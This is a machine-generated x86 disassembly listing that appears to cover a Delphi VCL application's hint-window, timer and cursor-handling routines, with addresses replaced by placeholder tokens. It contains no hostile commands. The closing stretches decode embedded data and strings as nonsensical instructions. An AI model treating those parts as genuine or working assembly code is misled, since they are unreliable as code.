push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43333c
mov edi eax
call sub_431c38
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_435c5c
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_435c5c
sub_454afc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454c0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_454a84
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_452b34
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_431bf4
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_454cbc
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_454bb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_455054
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454a20
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_419658
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454c13
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed8
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_454c1c
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_451fb0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_451f9c
movzx edx di
xor ecx ecx
call sub_435c5c
inc esi
dec ebx
jne r-xdata
sub_454c58
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_453d74
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_453d74
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_454c1c
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_454cbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4042c0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403f08
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e9d8
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441290
xor eax eax
push ebp
push sub_454d41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_454d50
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_454dac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_451fb0
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_454d50
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_451f9c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_454d50
pop ecx
jmp r-xdata
mov eax ebx
call sub_43b594
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_43b290
push eax
call IsChild
test eax eax
jne r-xdata
sub_454e34
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4054f0
call sub_423850
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_454e5c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_454ea0
push sub_452b8c
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_455054
sub_454ec8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4067a0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4345a8
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43333c
call sub_452b6c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_455054
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4067a0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4345a8
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_455054
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_454e5c
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_435c5c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_4552ec
jmp r-xdata
sub_454fd8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_454ea0
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_4552ec
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_455010
jmp r-xdata
sub_455010
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43b594
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_43b290
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_43b290
push eax
call ShowWindow
sub_455054
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_455010
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_452cf4
mov eax ebx
call sub_454ea0
sub_45508c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_4551ce
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41ee38
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407914
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45519f
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41eef0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4551a6
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45507c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45507c
mov [ ebp - 0x4 ] eax
sub_4551a6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_4551e0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4030f8
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403040
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_455240
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_4552da
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552e1
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403fa4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41da1c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40bf10
mov ebx eax
inc ebx
sub_4552ec
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404820
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_455672
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_455054
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_454e5c
jmp r-xdata
call sub_44b524
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455679
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048e4
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43333c
call sub_452b6c
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45508c
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_451f30
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_434430
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4345d4
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_452b34
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_431bb0
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403f4c
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_435c5c
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_4551e0
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_4032f4
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4345a8
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4345a8
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_434c30
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_452c80
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_455240
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_454e5c
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_454e5c
jmp r-xdata
sub_455680
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403f08
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403f08
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4556bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_435c5c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_435c5c
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_441158
sub_45574c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_455774
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_455818
add [ eax ] eax
add [ eax ] al
ror [ esi + eax * 2 + 0x4314d000 ] 0x0
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45587b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455882
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_44b2d0
mov eax sub_44b550
call sub_413528
mov eax [ rw-data ]
push eax
call CloseHandle
sub_455a83
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
push cs
dec edi
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push ebp
jo r-xdata
add [ eax ] al
add [ esi ] 0x0
or ecx [ edi + 0x6e ]
popad
je r-xdata
dec edi
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
inc ebp
js r-xdata
add [ ebx ] cl
dec edi
outsb
hlt
inc esp
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000e ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
popad
hlt
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
pushad
add [ eax ] al
jmp [ eax ]
adc [ ecx + 0x45 ] ah
and [ ecx + 0x980044 ] dh
add bh bh
cwde
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000f ] al
outsb
push ebx
je r-xdata
cli
jmp [ edi + ecx * 4 + 0x5 ]
je r-xdata
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0xc00455f ] bl
push esp
dec ebp
jne r-xdata
movsb [ edi ] [ esi ]
inc ecx
imul ebp [ esi + 0x67 ] 0x6e616843
mov eax eax
test al 0x5c
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
xlat
inc ebx
popad
jae r-xdata
pop esi
pop ebx
retn
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
shl [ edx ] 0x41
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
inc eax
add ah ch
pop esp
inc ebp
add [ edi ] al
or al 0x54
dec ebp
jne r-xdata
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
je r-xdata
cmp [ eax + 0x32 ] 0x0
inc ebx
popad
jae r-xdata
jb r-xdata
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add al bh
lahf
inc ecx
add [ ecx ] bh
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
add [ eax ] dl
popad
inc ebp
pop esp
inc ebp
add [ ebx + 0x20041 ] bh
or [ ecx + 0x70 ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
fmul [ ebx + 0x53ff3c43 ]
cmp [ ebx - 0x3d ] bl
mov eax eax
je r-xdata
pop ebx
retn
add [ eax ] al
nop
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419cdc
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
test bl bl
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_455f74
mov eax esi
add esp 0xc
call sub_40345c
pop [ fs : 0x0 ]
sub_455acd
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0005 ] al
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
insb
jo r-xdata
dec esp
mov al 0x44
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0006 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f060008 ] al
outsb
dec eax
cmovno eax [ eax ]
pop eax
add [ eax ] al
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec edi
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
inc esp
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000e ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
popad
hlt
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
pushad
add [ eax ] al
jmp [ eax ]
adc [ ecx + 0x45 ] ah
and [ ecx + 0x980044 ] dh
add bh bh
cwde
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000f ] al
outsb
push ebx
je r-xdata
cli
jmp [ edi + ecx * 4 + 0x5 ]
je r-xdata
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0xc00455f ] bl
push esp
dec ebp
jne r-xdata
movsb [ edi ] [ esi ]
inc ecx
imul ebp [ esi + 0x67 ] 0x6e616843
